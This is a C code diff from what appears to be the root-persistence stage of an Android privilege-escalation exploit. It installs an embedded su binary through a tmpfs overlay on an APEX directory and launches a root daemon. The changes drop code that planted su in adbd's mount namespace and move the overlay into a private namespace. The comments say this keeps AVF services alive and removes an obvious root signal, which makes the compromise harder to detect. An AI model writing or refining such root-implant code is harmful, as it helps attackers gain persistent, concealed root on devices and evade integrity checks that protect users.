@@ -34,19 +34,54 @@ static int path_is_mounted(const char *path) {
     return 0;
   }
 
-  char mounts[16384];
-  ssize_t n = read(fd, mounts, sizeof(mounts) - 1);
-  int saved_errno = errno;
+  /*
+   * /proc/mounts is larger than any fixed stack buffer on a real device (~24
+   * KiB on android16-6.12 before the exploit adds anything). A single read()
+   * into a 16 KiB buffer truncated the file, so a mount late in it - such as
+   * /apex/com.android.virt/bin around line 155 - never matched and
+   * ensure_su_mount() re-mounted on every call, stacking tmpfs overlays. Read
+   * the whole file so the check is exact.
+   */
+  char *mounts = NULL;
+  size_t cap = 0;
+  size_t len = 0;
+  for (;;) {
+    if (cap - len < 4096) {
+      size_t next = cap ? cap * 2 : 65536;
+      char *grown = realloc(mounts, next);
+      if (!grown) {
+        free(mounts);
+        close(fd);
+        return 0;
+      }
+      mounts = grown;
+      cap = next;
+    }
+    ssize_t n = read(fd, mounts + len, cap - len - 1);
+    if (n < 0) {
+      if (errno == EINTR) {
+        continue;
+      }
+      free(mounts);
+      close(fd);
+      return 0;
+    }
+    if (n == 0) {
+      break;
+    }
+    len += (size_t)n;
+  }
   close(fd);
-  if (n <= 0) {
-    errno = saved_errno;
+  if (!mounts) {
     return 0;
   }
-  mounts[n] = 0;
+  mounts[len] = 0;
 
   char needle[512];
   snprintf(needle, sizeof(needle), " %s ", path);
-  return strstr(mounts, needle) != NULL;
+  int found = strstr(mounts, needle) != NULL;
+  free(mounts);
+  return found;
 }
 
 static int ensure_su_mount(void) {
@@ -155,82 +190,38 @@ static int write_embedded_su(void) {
   return write_embedded_su_file(SU_DST_DIR, SU_DST);
 }
 
-static pid_t find_adbd_pid(void) {
-  DIR *dir = opendir("/proc");
-  if (!dir) {
-    return -1;
-  }
-
-  struct dirent *de;
-  while ((de = readdir(dir)) != NULL) {
-    char *end = NULL;
-    long pid_long = strtol(de->d_name, &end, 10);
-    if (!end || *end || pid_long <= 1 || pid_long > INT32_MAX) {
-      continue;
-    }
-
-    char path[64];
-    snprintf(path, sizeof(path), "/proc/%ld/comm", pid_long);
-    char comm[32];
-    read_first_line(path, comm, sizeof(comm));
-    if (strcmp(comm, "adbd") == 0) {
-      closedir(dir);
-      return (pid_t)pid_long;
-    }
-  }
-
-  closedir(dir);
-  return -1;
-}
-
-static int install_su_in_pid_mntns(pid_t target) {
-  pid_t child = fork();
-  if (child == 0) {
-    char ns_path[64];
-    snprintf(ns_path, sizeof(ns_path), "/proc/%d/ns/mnt", target);
-    int ns_fd = open(ns_path, O_RDONLY | O_CLOEXEC);
-    if (ns_fd < 0) {
-      _exit(2);
-    }
-    if (setns(ns_fd, CLONE_NEWNS) != 0) {
-      _exit(3);
-    }
-    close(ns_fd);
-    if (!ensure_su_mount()) {
-      _exit(4);
-    }
-    _exit(write_embedded_su_file(SU_DST_DIR, SU_DST) ? 0 : 5);
-  }
-  if (child < 0) {
-    return 0;
-  }
-
-  int status = 0;
-  while (waitpid(child, &status, 0) < 0 && errno == EINTR) {
-  }
-  return WIFEXITED(status) && WEXITSTATUS(status) == 0;
-}
-
-static int install_adb_visible_su(void) {
-  pid_t adbd = find_adbd_pid();
-  if (adbd <= 0) {
-    pr_info("adb-visible su skipped: adbd pid not found\n");
-    return 0;
-  }
-  int ok = install_su_in_pid_mntns(adbd);
-  pr_info("adb-visible su install adbd=%d ok=%d path=%s\n", adbd, ok, SU_DST);
-  return ok;
-}
-
 static int install_local_su_client(void) {
   int ok = write_embedded_su_file("/data/local/tmp", SU_LOCAL);
   pr_info("local su client install ok=%d path=%s\n", ok, SU_LOCAL);
   return ok;
 }
 
-static void install_extra_su_clients(void) {
-  install_local_su_client();
-  install_adb_visible_su();
+/*
+ * Give the daemon a private mount namespace before it installs its own su.
+ *
+ * The old flow mounted a tmpfs over /apex/com.android.virt/bin in the *shared*
+ * mount namespace (the exploit process ns for the local copy, adbd's ns - which
+ * is init's - for the "adb-visible" one). Every process in that namespace then
+ * saw the shadow instead of the real APEX payload: virtualizationservice could
+ * not be exec'd, so the AVF KeyMint /avf service and the AppSearch
+ * virtualization services died until a reboot, and the stray
+ * /apex/com.android.virt/bin/su was a trivial root signal.
+ *
+ * None of that is necessary. The overlay only ever has to exist for the daemon
+ * that exec's it. Unshare first, make the new namespace private so the mount
+ * cannot propagate back to the shared one, and the rest of the system never
+ * sees it: AVF keeps working and no su appears under /apex.
+ */
+static int enter_private_mount_ns(void) {
+  if (unshare(CLONE_NEWNS) != 0) {
+    pr_error("su daemon: unshare(CLONE_NEWNS) errno=%d\n", errno);
+    return 0;
+  }
+  if (mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != 0) {
+    pr_error("su daemon: MS_PRIVATE errno=%d\n", errno);
+    return 0;
+  }
+  return 1;
 }
 
 static void run_su_daemon_direct(const char *client_uid) {
@@ -326,6 +317,23 @@ static pid_t start_su_daemon(void) {
     dprintf(STDERR_FILENO, "su daemon: starting, attempting exec %s uid=%s\n",
             SU_DST, client_uid);
 
+    /*
+     * Install the daemon's own binary, and the tmpfs that carries it, inside a
+     * private mount namespace so the overlay never reaches the shared one; see
+     * enter_private_mount_ns(). If that fails for any reason, fall back to the
+     * shared-namespace client copy at SU_LOCAL rather than lose root.
+     */
+    const char *daemon_path = SU_DST;
+    if (enter_private_mount_ns() && write_embedded_su()) {
+      dprintf(STDERR_FILENO, "su daemon: installed %s in a private mount ns\n",
+              SU_DST);
+    } else {
+      daemon_path = SU_LOCAL;
+      dprintf(STDERR_FILENO,
+              "su daemon: private su install failed errno=%d, using %s\n",
+              errno, SU_LOCAL);
+    }
+
     int null_fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
     if (null_fd >= 0) {
       dup2(null_fd, STDIN_FILENO);
@@ -343,7 +351,7 @@ static pid_t start_su_daemon(void) {
      * TENTATIVO 1: execl normale.
      * Se il sistema è sano, questo funziona e non ritorna mai.
      */
-    execl(SU_DST, "su", "--umh", client_uid, (char *)NULL);
+    execl(daemon_path, "su", "--umh", client_uid, (char *)NULL);
 
     /*
      * Se execl ritorna, c'è stato un errore (file non trovato,
@@ -395,12 +403,14 @@ int install_embedded_su(pid_t *daemon_pid) {
     *daemon_pid = -1;
   }
   pr_info("install_embedded_su: starting\n");
-  if (!write_embedded_su()) {
-    pr_error("install_embedded_su: write_embedded_su failed errno=%d\n", errno);
-    return 0;
-  }
-  pr_info("install_embedded_su: write ok, starting daemon\n");
-  install_extra_su_clients();
+  /*
+   * The app drives the daemon through the client at /data/local/tmp/su, which
+   * must live in the shared namespace. The daemon installs its own copy (the
+   * /apex/com.android.virt/bin/su that backs its PATH and SELinux label) inside
+   * a private mount namespace; see enter_private_mount_ns().
+   */
+  install_local_su_client();
+  pr_info("install_embedded_su: starting daemon\n");
 
   pid_t pid = start_su_daemon();
   if (pid <= 0) {
